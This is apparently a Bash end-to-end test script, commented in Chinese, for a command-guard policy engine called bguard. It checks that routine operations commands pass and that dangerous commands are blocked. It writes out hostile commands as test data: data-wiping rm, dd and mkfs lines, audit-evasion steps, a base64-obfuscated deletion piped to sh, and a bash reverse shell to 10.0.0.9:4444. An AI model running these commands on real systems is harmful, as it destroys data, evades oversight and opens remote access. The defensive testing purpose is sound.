#!/usr/bin/env bash
# 端到端验证：在模拟主机上执行命令，同时用 bguard 语义引擎裁决，
# 证明 (1) 高危/绕过被拦且给出原因 (2) 正常运维零误拦。
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/.." && pwd)"
cd "$ROOT"
export PATH="/Applications/Docker.app/Contents/Resources/bin:$PATH"

POLICY=configs/default-policy.yaml
PASS=0; FAIL=0

# check_line <期望 deny|allow> <命令...>
check_line() {
  local want="$1"; shift
  local cmd="$*"
  local out rc
  out=$(go run ./cmd/bguard check --policy "$POLICY" --cmd "$cmd" 2>&1) && rc=0 || rc=$?
  local got="allow"; [ "$rc" -ne 0 ] && got="deny"
  if [ "$got" = "$want" ]; then
    printf "  \033[32mPASS\033[0m 期望%-5s 实际%-5s  %s\n" "$want" "$got" "$cmd"
    PASS=$((PASS+1))
  else
    printf "  \033[31mFAIL\033[0m 期望%-5s 实际%-5s  %s\n" "$want" "$got" "$cmd"
    echo "$out" | sed 's/^/        /'
    FAIL=$((FAIL+1))
  fi
}

echo "================ A. 正常运维（必须放行）================"
check_line allow "ls -la /var/log"
check_line allow "systemctl status nginx"
check_line allow "mysql -e 'SELECT COUNT(*) FROM orders;'"
check_line allow "tail -f /var/log/app.log"
check_line allow "df -h"

echo
echo "================ B. 直接高危（必须拦截）================"
check_line deny  "rm -rf /var/lib/mysql"
check_line deny  "dd if=/dev/zero of=/dev/sda bs=1M count=1"
check_line deny  "systemctl stop auditd"
check_line deny  "history -c"
check_line deny  "mkfs.ext4 -F /dev/vdb"

echo
echo "================ C. 绕过手法（必须按语义拦截）========="
check_line deny  "alias c='rm -rf /etc'; c"
check_line deny  "D=/var/lib/mysql; rm -rf \$D"
check_line deny  "echo cm0gLXJmIC92YXIvbGliL215c3FsCg== | base64 -d | sh"
check_line deny  "find /var/lib/mysql -name '*.ibd' -exec rm -f {} +"
check_line deny  "sudo rm -rf /etc"
check_line deny  "ssh db-01 'rm -rf /var/lib/mysql'"
check_line deny  "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"
check_line deny  "docker run --privileged -it alpine sh"
check_line deny  "redis-cli FLUSHALL"

echo
echo "================ D. 真实模拟主机连通性 ================"
if docker ps --format '{{.Names}}' | grep -q '^bg-app-01$'; then
  echo "  [app-01] 模拟 systemctl（经容器真实执行）:"
  docker exec bg-app-01 /usr/local/sbin/systemctl status nginx | sed 's/^/    /'
  echo "  [db-01] 模拟 mysql 破坏性语句回显:"
  docker exec bg-db-01 /usr/local/sbin/mysql -e 'DROP DATABASE x' | sed 's/^/    /'
  echo "  [web-01] 审计日志目录存在性:"
  docker exec bg-web-01 ls /var/log/audit | sed 's/^/    /'
else
  echo "  （模拟主机未运行，跳过容器内验证；可执行 lab/up.sh 启动）"
fi

echo
echo "================ 结果: PASS=$PASS FAIL=$FAIL ================"
[ "$FAIL" -eq 0 ]
